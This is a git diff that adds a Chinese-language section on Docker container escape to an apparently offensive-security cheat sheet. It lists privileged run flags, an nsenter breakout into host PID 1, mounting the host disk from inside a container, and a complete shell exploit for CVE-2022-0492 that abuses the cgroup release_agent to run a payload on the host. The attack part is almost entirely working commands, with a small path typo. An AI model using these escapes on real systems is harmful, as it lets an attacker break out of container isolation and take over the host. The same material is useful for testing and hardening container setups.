@@ -119,3 +119,123 @@ images = client.images.list()
 for image in images:
     print(image.id, image.tags)
 ```
+
+## 容器逃逸
+
+### 特权容器逃逸
+
++ --cap-add=ALL
++ --security-opt apparmor=unconfined
++ --security-opt seccomp=unconfined
++ --security-opt label:disable
++ --pid=host
++ --userns=host
++ --uts=host
++ --cgroupns=host
++ mount /dev
+
+1.hostpid
+
+Docker启动选项
+```bash
+docker run --rm -u 0 -it --pid=host --privileged [镜像] /bin/bash
+```
+
+容器内执行
+```Bash
+nsenter --target 1 --mount --uts --ipc --net --pid – bash
+```
+
+2.挂载宿主机文件
+
+Docker启动选项
+```Bash
+docker run --rm -u 0 -it --privileged [镜像] /bin/bash
+docker run --rm -u 0 -it --device=/dev/sda1 [镜像] /bin/bash
+```
+
+容器内执行
+```Bash
+mkdir -p /mnt/docker
+mount /dev/sda1 /mnt/docker
+cd /mnd/docker
+```
+
+3.hostPath
+
+容器内执行
+```Bash
+echo 1 > /proc/sysrq-trigger  //检查是否可写入
+cat /proc/cmdline  //获取root UID
+findfs UUID=UUID值  //查看文件系统
+mkdir /mnt-docker
+mount /dev/sda1 /mnt-docker
+debugfs /dev/sda1
+```
+
+4.CVE-2022-0492
+
+[UNIT42](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
+
+[HTB](https://www.hackthebox.com/blog/cve-2022-04920-carpe-diem-explained)
+
+枚举PID触发release_agent
+```Bash
+#!/bin/sh
+
+OUTPUT_DIR="/"
+MAX_PID=168607
+CGROUP_NAME="x"
+CGROUP_MOUNT="/docker"
+PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
+PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
+OUTPUT_NAME="${CGROUP_NAME}_payload.out"
+OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"
+
+# 运行一个长时间进程，以便搜索
+sleep 10000 &
+
+# 在宿主机上执行的有效负载
+cat > ${PAYLOAD_PATH} << __EOF__
+#!/bin/sh
+
+OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
+
+ps -eaf > \${OUTPATH} 2>&1  //在宿主机上运行的命令
+__EOF__
+
+chmod a+x ${PAYLOAD_PATH}
+
+# cgroup挂载
+mkdir ${CGROUP_MOUNT}
+mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
+mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
+echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release
+
+# 枚举宿主机PID
+TPID=1
+while [ ! -f ${OUTPUT_PATH} ]
+do
+  if [ $((${TPID} % 100)) -eq 0 ]
+  then
+    echo "Checking pid ${TPID}"
+    if [ ${TPID} -gt ${MAX_PID} ]
+    then
+      echo "Exiting at ${MAX_PID} :-("
+      exit 1
+    fi
+  fi
+  # 将release_agent路径设置为枚举到的PID
+  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
+  # 触发release_agent
+  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
+  TPID=$((${TPID} + 1))
+done
+
+# 捕获输出
+sleep 1
+echo "Output:"
+cat ${OUTPUT_PATH}
+```
+
+### Docker挂载
